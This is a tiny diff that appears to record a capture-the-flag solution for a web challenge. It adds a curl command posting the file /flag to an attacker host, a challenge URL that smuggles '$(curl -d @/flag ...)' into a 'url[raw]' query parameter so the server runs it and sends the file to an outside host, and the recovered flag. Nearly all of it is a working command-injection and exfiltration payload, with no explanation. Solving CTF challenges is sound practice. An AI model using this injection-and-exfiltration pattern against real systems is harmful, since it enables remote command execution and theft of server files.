@@ -1,0 +1,5 @@
+curl -d @/flag https://attack.com
+
+http://34.146.180.210:3000/chall?url[raw]=$(curl%20-d%20@/flag%20https://3.34.190.60.nip.io/)
+
+LINECTF{f405e3a998df00e4a9e9cc153d353770}
